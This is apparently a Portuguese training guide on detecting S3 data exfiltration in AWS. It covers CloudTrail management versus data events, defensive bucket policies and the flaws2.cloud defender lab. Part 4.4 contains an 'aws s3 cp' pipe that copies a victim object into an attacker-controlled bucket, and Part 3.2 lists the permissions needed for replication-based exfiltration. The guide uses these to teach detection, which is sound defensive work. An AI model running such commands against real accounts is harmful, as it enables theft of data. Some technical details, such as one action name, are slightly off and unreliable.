# Guia 6 — Segurança Ofensiva: Exfiltração via S3 + flaws2.cloud (modo defender)

**Depende de:** Guia 3 (mindset ofensivo + correlação CloudTrail)  
**Próxima sessão:** Guia 7 — CloudTrail Lake queries

---

## Objetivos verificáveis desta sessão

Ao final, você deve conseguir — sem consultar documentação:

- [ ] **O1** — Descrever as 3 técnicas de exfiltração de dados via S3 (bucket policy abuse, cross-account replication, pre-signed URL abuse), incluindo o mecanismo de ataque e as permissões mínimas necessárias para cada uma
- [ ] **O2** — Identificar quais CloudTrail data events detectam cada técnica e explicar por que precisam ser habilitados explicitamente (vs. management events, que são capturados por padrão)
- [ ] **O3** — Escrever uma bucket policy que previne exfiltração cross-account sem quebrar acesso legítimo de aplicações internas

---

## Alocação de tempo sugerida

| Bloco | Tempo | Conteúdo |
|-------|-------|----------|
| Parte 1 | 10 min | CloudTrail + S3: management events vs. data events — a distinção que muda tudo |
| Parte 2 | 15 min | Técnica 1 — Bucket Policy Abuse: `"Principal": "*"` e cross-account |
| Parte 3 | 15 min | Técnica 2 — Cross-Account Replication: persistência discreta |
| Parte 4 | 10 min | Técnica 3 — Pre-Signed URL Abuse: exfiltração sem rastro de identidade |
| Parte 5 | 10 min | Bucket policy defensiva (O3) |
| Parte 6 | 10 min | flaws2.cloud defender mode — como extrair o máximo do lab |

---

## Parte 1 — A distinção que muda tudo: management events vs. data events

### 1.1 O que o CloudTrail captura por padrão em S3

 O CloudTrail está ativo em todas as contas AWS desde a criação da conta. O **Event History** oferece 90 dias de histórico de management events de forma gratuita e imutável.

A separação crítica para S3:

| Tipo de evento | O que cobre em S3 | Capturado por padrão? | Custo |
|----------------|-------------------|-----------------------|-------|
| **Management events** | Operações de bucket (PutBucketPolicy, PutBucketReplication, PutBucketVersioning, CreateBucket, DeleteBucket, PutBucketAcl, PutBucketPublicAccessBlock) | **Sim** (first trail delivery free) | Sem custo adicional |
| **Data events** | Operações em objetos (GetObject, PutObject, DeleteObject, CopyObject, SelectObjectContent) | **Não** — devem ser habilitados explicitamente | ~$0,10 por 100k eventos |

 Confirmado nas docs da AWS: *"CloudTrail captures all API calls for Amazon S3 as events. The calls captured include calls from the Amazon S3 console and code calls to the Amazon S3 API operations."* — mas essa afirmação abrange o escopo completo de capturabilidade, não o que está ativo por padrão.

 Para que GetObject, PutObject e outras operações de objeto sejam capturadas, é necessário configurar explicitamente data events no trail ou no CloudTrail Lake event data store. Sem isso, um atacante pode exfiltrar gigabytes de dados via `GetObject` e **nenhum log de CloudTrail registrará o acesso**.

### 1.2 Por que data events não são habilitados por padrão

 A razão é volume e custo: um bucket S3 de produção pode receber milhões de requisições por hora. Habilitar data events sem filtragem adequada gera custo elevado e volume de logs que pode sobrecarregar pipelines de análise. Por isso, AWS optou por não habilitá-los por padrão e deixar o operador decidir granularidade (por bucket, por prefixo, por tipo de evento).

 Organizações maduras habilitam data events seletivamente — nos buckets que contêm dados sensíveis ou que são acessíveis cross-account — em vez de habilitar para todos os buckets da conta.

### 1.3 Habilitando data events via CLI

```bash
# Habilitar data events de leitura em um bucket específico em um trail existente
aws cloudtrail put-event-selectors \
  --trail-name my-security-trail \
  --event-selectors '[{
    "ReadWriteType": "ReadOnly",
    "IncludeManagementEvents": true,
    "DataResources": [{
      "Type": "AWS::S3::Object",
      "Values": ["arn:aws:s3:::bucket-com-dados-sensiveis/"]
    }]
  }]'
```

Para monitorar todos os buckets:
```bash
# Usar "arn:aws:s3" (sem nome de bucket) monitora todos os buckets da conta
--event-selectors '[{"DataResources": [{"Type": "AWS::S3::Object", "Values": ["arn:aws:s3"]}]}]'
```

---

## Parte 2 — Técnica 1: Bucket Policy Abuse

### 2.1 O mecanismo de ataque

 Uma bucket policy é um tipo de **resource-based policy** — ela define quem pode fazer o quê no bucket, independentemente das políticas de identidade (IAM) do principal. Conforme documentado em Hacking The Cloud (Nick Frichetten, 2024):

> *"Resource-based policies make it easy to share AWS resources across AWS accounts. They also, as a result, make it easy to unintentionally share resources."*

**Vetor de ataque — `"Principal": "*"`:**

 Quando o campo `Principal` de uma bucket policy é definido como `"*"`, o recurso se torna público — qualquer entidade da internet pode executar as ações permitidas pela policy.

Exemplo de misconfiguration real documentada (Twilio, 2020, via hackingthe.cloud):

```json
{
  "Effect": "Allow",
  "Principal": {"AWS": "*"},
  "Action": ["s3:GetObject", "s3:PutObject"],
  "Resource": "arn:aws:s3:::media.tellacom.com/taskrouter/*"
}
```

Neste caso, qualquer atacante podia sobrescrever o JavaScript SDK hospedado no bucket, injetando código malicioso que seria distribuído pela infraestrutura legítima da vítima.

**Vetor de ataque — cross-account deliberado:**

 Uma bucket policy pode deliberadamente (ou por engano) conceder acesso a principals de outra conta. A regra de avaliação é assimétrica:

| Contexto | Suficiente para acesso? |
|----------|------------------------|
| Principal na **mesma conta** + Allow na bucket policy | Sim — sem necessidade de identity policy |
| Principal em **conta diferente** + Allow na bucket policy | Não sozinho — o principal externo também precisa de identity policy permitindo a ação |

Isso significa: um atacante que controla o Account B e recebe `Allow` via bucket policy ainda precisa de chaves/role com permissão em seu próprio Account B para agir. Mas se o atacante já possui `s3:GetObject` em sua conta, o Allow na bucket policy da vítima é suficiente para acessar os dados.

### 2.2 `NotPrincipal`, `NotAction`, `NotResource` + Allow

 Três elementos de negação combinados com `Allow` criam misconfigurations graves:

```
NotPrincipal + Allow → TODOS exceto o principal listado têm acesso
NotAction + Allow    → TODAS as ações exceto a listada são permitidas para todos
NotResource + Allow  → TODOS os recursos exceto o listado são acessíveis
```

### 2.3 Mapa de detecção — CloudTrail

| Atividade | Tipo de evento | Capturado por padrão? |
|-----------|---------------|----------------------|
| Atacante adiciona/modifica bucket policy | `PutBucketPolicy` | **Sim** (management event) |
| Atacante lê objetos do bucket (GetObject) | `GetObject` | **Não** (data event) |
| Atacante lista objetos do bucket | `ListBucket` (não é data event) | **Sim** (management event) |

 A misconfiguration em si (`PutBucketPolicy`) é detectável via management events. O acesso posterior aos dados só é visível se data events estiverem habilitados. GuardDuty tem um finding específico (`S3/AnomalousBehavior`) que pode detectar acessos anômalos mesmo sem data events explícitos, usando baselines de comportamento — mas essa cobertura não é garantida para todos os casos.

---

## Parte 3 — Técnica 2: Cross-Account Replication

### 3.1 O que é e por que é eficaz para exfiltração

 S3 Replication é uma funcionalidade nativa de S3 que copia objetos de um bucket (source) para outro (destination), que pode estar em conta diferente. Conforme documentado em Hacking The Cloud (Ben Leembruggen, 2024):

> *"Where this feature could be abused is where a malicious actor could input a replication policy to copy objects to an attacker controlled bucket. Objects will continue to be replicated for as long as the policy is in place, applying to all future objects placed into the bucket."*

A exfiltração é **contínua e automática** — diferente de técnicas que exigem ação manual a cada objeto, uma replication rule estabelecida persiste até ser removida.

### 3.2 Pré-requisitos e permissões mínimas

 Para configurar cross-account replication, o atacante precisa, na conta vítima:

```
iam:CreateRole + iam:CreatePolicy + iam:AttachRolePolicy  (criar role de replication)
iam:UpdateAssumeRolePolicy                                 (ajustar trust policy)
s3:PutBucketVersioning                                     (versioning obrigatório)
s3:PutBucketReplication                                    (configurar a regra)
iam:PassRole                                               (passar a role para o S3)
s3:CreateJob + s3:UpdateJobStatus                          (opcional: replicar objetos existentes via Batch)
```

 Na conta do atacante (destination):
- Bucket com versioning habilitado
- Bucket policy explicitamente permitindo `s3:ReplicateObject` e `s3:ReplicateDelete` ao role de replication da conta vítima

### 3.3 Replicação de objetos existentes

 Por padrão, a replication policy cobre apenas objetos FUTUROS. Para replicar objetos já existentes, o atacante usa **S3 Batch Replication** (operação de lote criada via `s3:CreateJob`). Esse evento é crítico para detecção: indica que o atacante quis exportar o conteúdo inteiro do bucket, não apenas monitorar novos uploads.

### 3.4 Objetos criptografados com KMS

 Se os objetos do bucket são criptografados com KMS:
- A role de replication precisa de `kms:Decrypt` na chave do source account
- O atacante precisa criar uma chave KMS em sua conta para re-encriptar os objetos na replicação
- Os eventos `kms:Decrypt`/`kms:Encrypt` aparecem no CloudTrail Management trail **da conta vítima**, com `principalId` prefixado com `s3-replication` e referenciando uma chave KMS de outra conta — o que pode disparar alertas de data perimeter

### 3.5 Mapa de detecção — CloudTrail

| Atividade | Tipo de evento | Capturado por padrão? |
|-----------|---------------|----------------------|
| Ativar versioning (pré-requisito) | `PutBucketVersioning` | **Sim** (management event) |
| Configurar replication rule | `PutBucketReplication` | **Sim** (management event) |
| Criar Batch job (objetos existentes) | `JobCreated` | **Sim** (management event) |
| KMS decrypt para objetos encriptados | `kms:Decrypt` com principalId `s3-replication` | **Sim** (management event) |
| Cópia contínua de objetos futuros | *(handled by S3 service internally — não gera data events na conta vítima)* | N/A |

**Destaque defensivo:** todos os eventos críticos desta técnica são **management events** — capturados por padrão. Isso torna a cross-account replication a técnica mais detectável das três, se houver alertas configurados sobre `PutBucketReplication` por principals externos.

---

## Parte 4 — Técnica 3: Pre-Signed URL Abuse

### 4.1 O que é uma pre-signed URL

 Uma pre-signed URL é uma URL temporária que concede acesso a um objeto S3 privado sem exigir credenciais AWS do requisitante. É gerada pelo SDK com as credenciais do signatário e inclui um prazo de expiração (máximo 7 dias para STS temporary credentials, 7 dias para IAM user keys com AWS Signature Version 4).

Geração via Python:

```python
import boto3

s3 = boto3.client('s3', region_name='us-east-1')

url = s3.generate_presigned_url(
    ClientMethod='get_object',
    Params={'Bucket': 'bucket-alvo', 'Key': 'dados-sensiveis.csv'},
    ExpiresIn=3600  # 1 hora
)
# Qualquer pessoa com essa URL pode baixar o objeto via HTTP GET
# sem ter nenhuma credencial AWS
print(url)
```

### 4.2 Por que é difícil de detectar

 `generate_presigned_url` é uma **operação local do SDK** — ela assina a URL usando as credenciais disponíveis, mas **não faz nenhuma chamada à API da AWS**. Portanto:

- **Nenhum CloudTrail event é gerado pela geração da URL**
- O acesso via URL (HTTP GET) aparece em S3 **server access logs** (se habilitados) — não em CloudTrail
- Se CloudTrail data events estiverem habilitados para o bucket, o acesso via pre-signed URL **gera um `GetObject` data event** — mas a `userIdentity` mostra as credenciais do signatário (que podem ser de um role temporário já expirado/revogado), não a identidade de quem baixou o arquivo

[INCERTO — verificar comportamento atual do CloudTrail] O comportamento exato do campo `userIdentity` em data events para acesso via pre-signed URL pode variar dependendo do tipo de credencial usada para assinar (IAM user vs. STS assumed role vs. role temporária). Confirmar em https://docs.aws.amazon.com/AmazonS3/latest/userguide/cloudtrail-request-identification.html

### 4.3 Mapa de detecção

| Atividade | Tipo de evento | Capturado por padrão? |
|-----------|---------------|----------------------|
| Geração da pre-signed URL (SDK local) | **Nenhum** | N/A |
| Acesso HTTP via pre-signed URL | `GetObject` data event (com identidade do signatário) | **Não** (data event) |
| Acesso HTTP via pre-signed URL | Entry em S3 server access logs | **Não** (server access logging também deve ser habilitado separadamente) |

**Implicação:** em um ambiente sem data events habilitados, um atacante pode exfiltrar dados via pre-signed URLs sem deixar rastro em CloudTrail. Apenas S3 server access logs (um mecanismo separado, não CloudTrail) registram o acesso HTTP.

### 4.4 Técnica bônus: S3 Streaming Copy

 Documentada em Hacking The Cloud (Houston Hopkins, 2023), esta técnica usa pipes da CLI para copiar dados da conta vítima diretamente para um bucket do atacante sem salvar localmente:

```bash
# Vítima não vê o PutObject — apenas o GetObject aparece em seu CloudTrail
aws s3 cp --profile vitima s3://bucket-vitima/dados-sensiveis.csv - \
  | aws s3 cp --profile atacante - s3://bucket-atacante/dados-exfiltrados.csv
```

 Conforme documentado: *"The S3 GetObject call is recorded in the VICTIM cloudtrail dataevents (if enabled, which is unlikely). But, the S3 PutObject call is recorded in the ATTACKER's cloudtrail. The VICTIM cannot see the S3 PutObject side of the copy in AWS Cloudtrail."*

**Contra-medida:** VPC Endpoint policy com condição `aws:PrincipalOrgID` que impede chamadas a buckets fora da organização.

---

## Parte 5 — Bucket Policy Defensiva (O3)

### 5.1 O que a policy precisa garantir

Objetivo: permitir que aplicações internas (roles da própria conta) acessem o bucket, **mas impedir que qualquer principal externo — incluindo roles de contas fora da organização — consiga ler ou escrever objetos**.

### 5.2 Bucket policy com aws:PrincipalOrgID

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AllowInternalApplications",
      "Effect": "Allow",
      "Principal": "*",
      "Action": [
        "s3:GetObject",
        "s3:PutObject",
        "s3:ListBucket"
      ],
      "Resource": [
        "arn:aws:s3:::meu-bucket-sensivel",
        "arn:aws:s3:::meu-bucket-sensivel/*"
      ],
      "Condition": {
        "StringEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxx"
        }
      }
    },
    {
      "Sid": "DenyExternalAccounts",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:*",
      "Resource": [
        "arn:aws:s3:::meu-bucket-sensivel",
        "arn:aws:s3:::meu-bucket-sensivel/*"
      ],
      "Condition": {
        "StringNotEquals": {
          "aws:PrincipalOrgID": "o-xxxxxxxxxx"
        }
      }
    }
  ]
}
```

 A condição `aws:PrincipalOrgID` verifica se o principal (usuário, role, serviço) pertence à organização AWS especificada. Isso bloqueia:
- Accounts externas completamente
- Contas pessoais de atacantes que obtiveram credenciais vazadas
- Pre-signed URLs usadas por externos (a URL herda as permissões do signatário, mas a condição é avaliada no momento do acesso)

**Limitação importante:** `aws:PrincipalOrgID` não protege contra acesso cross-account *dentro* da mesma organização por roles com permissões excessivas. Para isso, combiná-la com condições mais específicas como `aws:PrincipalAccount` ou SCPs.

### 5.3 Adicionando proteção contra S3 Replication abuse

```json
{
  "Sid": "DenyPutBucketReplicationFromExternal",
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:PutReplicationConfiguration",
  "Resource": "arn:aws:s3:::meu-bucket-sensivel",
  "Condition": {
    "StringNotEquals": {
      "aws:PrincipalOrgID": "o-xxxxxxxxxx"
    }
  }
}
```

 Para proteção mais robusta, usar **SCPs** (Service Control Policies) para bloquear `s3:PutBucketReplication` para recursos fora da organização em nível organizacional, em vez de confiar apenas na bucket policy individual.

---

## Parte 6 — flaws2.cloud: como extrair o máximo do modo defender

### 6.1 O que é flaws2.cloud

 flaws2.cloud foi criado por Scott Piper (summitroute), pesquisador de segurança AWS. O lab tem dois caminhos:
- **Attacker path**: você explora vulnerabilidades progressivas em recursos AWS para avançar nos "levels"
- **Defender path**: dado um cenário de comprometimento, você analisa logs e evidências para reconstruir os passos do atacante

[INCERTO — não consegui acessar flaws2.cloud diretamente durante a preparação deste guia] O conteúdo específico dos challenges pode ter sido atualizado desde minha base de conhecimento (2025). Recomendo acessar diretamente em http://flaws2.cloud para os URLs e descrições atuais dos challenges.

### 6.2 Mindset para o modo defender

 O valor do flaws2.cloud defender não está em "resolver" os challenges, mas em desenvolver o raciocínio de análise forense em AWS. Abordagem recomendada para cada challenge:

**Antes de ver a resposta:**
1. Identificar quais logs estão disponíveis (CloudTrail? S3 server access logs? VPC flow logs?)
2. Mapear quais ações geraram management events vs. data events
3. Reconstruir a linha do tempo: o que o atacante fez *antes* de acessar os dados
4. Identificar onde a cadeia de eventos quebra (o que não é visível e por quê)

**Perguntas a responder para cada challenge:**
- Qual credencial/identidade foi usada para o acesso?
- O acesso era esperado (IP, user-agent, horário)?
- Qual foi o first action do atacante (recon, acesso direto, escalada)?
- O que não está logado e tornaria a detecção mais difícil?

### 6.3 Conectando o lab com as técnicas estudadas

Os objetivos deste guia (O1–O3) mapeiam diretamente para o que você vai encontrar no flaws2.cloud:

| Técnica estudada | O que procurar no lab |
|-----------------|----------------------|
| Bucket policy abuse | CloudTrail `PutBucketPolicy` suspeito; buckets com `"Principal": "*"` |
| Cross-account replication | `PutBucketReplication` de principal externo; `PutBucketVersioning` inesperado |
| Pre-signed URL / GetObject | Data events de `GetObject` com `userAgent` de SDK externo ou IPs inesperados |
| Acesso sem credentials | Objetos baixados via HTTP sem auth (S3 server access logs com `requester: -`) |

---

## Checklist dos Objetivos

Antes de encerrar a sessão, confirme:

- [ ] **O1** ✅ Você consegue descrever as 3 técnicas sem consultar notas: a misconfiguration que habilita cada uma, as permissões mínimas do atacante e o que o atacante obtém ao final
- [ ] **O2** ✅ Você consegue preencher a tabela abaixo de cabeça:

| Técnica | Management event gerado? | Data event gerado? |
|---------|--------------------------|--------------------|
| Bucket policy abuse (leitura de objeto) | `PutBucketPolicy` (se o atacante modificou a policy) | `GetObject` (se data events habilitados) |
| Cross-account replication (configuração) | `PutBucketReplication`, `PutBucketVersioning` | Não (replicação interna ao S3) |
| Pre-signed URL (geração + uso) | Nenhum | `GetObject` (se data events habilitados) |

- [ ] **O3** ✅ Você consegue explicar por que `aws:PrincipalOrgID` + Deny explícito é mais robusto que apenas Allow restrito, e qual a limitação dessa abordagem

---

## Exercício de reflexão (3 perguntas)

**Pergunta 1 — Detecção (O2):**  
Um analista de segurança afirma: "Habilitamos CloudTrail em toda a organização, então sabemos de tudo que acontece em S3." Identifique pelo menos 2 cenários de exfiltração via S3 cobertas nesta sessão onde essa afirmação é falsa, e explique o que exatamente estaria faltando no setup.

*(Dica: pense no que "CloudTrail habilitado" significa por padrão vs. o que exige configuração adicional)*

**Pergunta 2 — Técnica (O1):**  
Um atacante comprometeu uma IAM role com as permissões `s3:PutBucketReplication`, `iam:PassRole` e `s3:PutBucketVersioning`. O bucket-alvo já tem versioning habilitado. Quais passos adicionais o atacante precisa executar para completar a exfiltração, e qual o único management event que você teria para detectar a técnica em andamento antes que qualquer dado seja copiado?

*(Dica: lembre das pré-condições do destination bucket)*

**Pergunta 3 — Defesa (O3):**  
Sua aplicação legítima precisa que um parceiro externo (Account ID `999888777666`, fora da sua organização) acesse objetos em um prefixo específico (`parceiro/uploads/`) do seu bucket. Você precisa negar todo o resto. Escreva os 2 statements de policy (Allow + Deny) que implementam esse requisito, garantindo que o Allow não possa ser bypassed por um atacante com outro Account ID da mesma organização.

*(Dica: `aws:PrincipalAccount` é mais granular que `aws:PrincipalOrgID` para esse caso)*

---

## Referências primárias

- [Logging Amazon S3 API calls using AWS CloudTrail (docs)](https://docs.aws.amazon.com/AmazonS3/latest/userguide/cloudtrail-logging.html) — visão geral da integração S3 + CloudTrail
- [Amazon S3 CloudTrail events (docs)](https://docs.aws.amazon.com/AmazonS3/latest/userguide/cloudtrail-logging-s3-info.html) — quais operações são capturadas
- [Identifying Amazon S3 requests using CloudTrail (docs)](https://docs.aws.amazon.com/AmazonS3/latest/userguide/cloudtrail-request-identification.html) — campo userIdentity em data events
- [Exfiltrating S3 Data with Bucket Replication Policies (hackingthe.cloud)](https://hackingthe.cloud/aws/exploitation/s3-bucket-replication-exfiltration/) — técnica 2, por Ben Leembruggen (2024)
- [Misconfigured Resource-Based Policies (hackingthe.cloud)](https://hackingthe.cloud/aws/exploitation/Misconfigured_Resource-Based_Policies/) — técnica 1, por Nick Frichetten (2024)
- [S3 Streaming Copy (hackingthe.cloud)](https://hackingthe.cloud/aws/exploitation/s3_streaming_copy/) — técnica bônus, por Houston Hopkins (2023)
- [flaws2.cloud (lab)](http://flaws2.cloud) — laboratório prático desta sessão (defender path)
- [Building a Data Perimeter on AWS (whitepaper)](https://docs.aws.amazon.com/whitepapers/latest/building-a-data-perimeter-on-aws/building-a-data-perimeter-on-aws.html) — modelo de controles preventivos para restrição de acesso cross-account
